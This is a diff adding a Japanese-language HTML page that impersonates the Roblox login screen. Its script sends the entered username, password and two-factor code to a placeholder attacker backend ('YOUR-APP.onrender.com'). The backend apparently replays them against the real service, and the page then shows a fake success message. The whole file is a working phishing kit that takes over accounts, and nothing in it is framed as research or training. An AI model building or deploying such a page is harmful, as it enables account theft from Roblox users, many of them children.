@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{min-height:100vh;display:grid;place-items:center;background:#e8eaed;
+       font-family:"Helvetica Neue",Arial,"Hiragino Sans",sans-serif}
+  .card{width:360px;background:#fff;border-radius:8px;padding:32px 28px;
+        box-shadow:0 4px 24px rgba(0,0,0,.14)}
+  .logo{font-size:26px;font-weight:800;letter-spacing:-1px;color:#1c1c1c;
+        text-align:center;margin-bottom:6px}
+  .sub{text-align:center;font-size:12px;color:#666;margin-bottom:24px}
+  input{width:100%;padding:12px;margin-bottom:10px;border:1px solid #c8c8c8;
+        border-radius:4px;font-size:14px;outline:none}
+  input:focus{border-color:#1c1c1c}
+  button{width:100%;padding:12px;background:#1c1c1c;color:#fff;border:0;
+         border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}
+  button:disabled{opacity:.5;cursor:default}
+  .msg{font-size:12px;color:#c00;margin-top:12px;text-align:center;min-height:16px}
+  .ok{font-size:13px;color:#222;text-align:center;line-height:1.7}
+  .spin{display:inline-block;width:14px;height:14px;border:2px solid #fff4;
+        border-top-color:#fff;border-radius:50%;animation:r .7s linear infinite;
+        vertical-align:-2px;margin-right:6px}
+  @keyframes r{to{transform:rotate(360deg)}}
+  .hide{display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">ROBLOX</div>
+  <div class="sub">アカウントにログイン</div>
+
+  <form id="f1">
+    <input id="u" placeholder="ユーザー名またはメール" autocomplete="username" required>
+    <input id="p" type="password" placeholder="パスワード" autocomplete="current-password" required>
+    <button id="b1">ログイン</button>
+  </form>
+
+  <form id="f2" class="hide">
+    <input id="c" placeholder="認証コード" inputmode="numeric" required>
+    <button id="b2">確認</button>
+  </form>
+
+  <div id="done" class="hide ok">ログインが完了しました</div>
+  <div id="msg" class="msg"></div>
+</div>
+
+<script>
+const API = 'https://YOUR-APP.onrender.com';
+const $ = i => document.getElementById(i);
+let sid = null;
+
+const busy = (b, on, label) => {
+  b.disabled = on;
+  b.innerHTML = on ? '<span class="spin"></span>処理中…' : label;
+};
+
+$('f1').onsubmit = async e => {
+  e.preventDefault();
+  $('msg').textContent = '';
+  busy($('b1'), true);
+  try {
+    const r = await fetch(API + '/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: $('u').value.trim(), password: $('p').value })
+    });
+    const j = await r.json();
+
+    if (j.needs_2fa) {
+      sid = j.sid;
+      $('f1').classList.add('hide');
+      $('f2').classList.remove('hide');
+      $('c').focus();
+      return;
+    }
+    if (j.ok) return finish();
+    $('msg').textContent =
+      j.error === 'captcha' ? '確認作業中です。少し後で再試行してください'
+      : j.error === 'ratelimit' ? '混雑しています。少し待ってください'
+      : 'ユーザー名かパスワードが違います';
+  } catch {
+    $('msg').textContent = '通信エラー。再試行してください';
+  } finally { busy($('b1'), false, 'ログイン'); }
+};
+
+$('f2').onsubmit = async e => {
+  e.preventDefault();
+  $('msg').textContent = '';
+  busy($('b2'), true);
+  try {
+    const r = await fetch(API + '/verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sid, code: $('c').value.trim() })
+    });
+    const j = await r.json();
+    if (j.ok) return finish();
+    $('msg').textContent = j.error === 'expired' ? '時間切れ。最初からやり直してください'
+                                                 : 'コードが違います';
+  } catch {
+    $('msg').textContent = '通信エラー。再試行してください';
+  } finally { busy($('b2'), false, '確認'); }
+};
+
+function finish() {
+  $('f1').classList.add('hide');
+  $('f2').classList.add('hide');
+  $('done').classList.remove('hide');
+  $('msg').textContent = '';
+}
+</script>
+</body>
+</html>
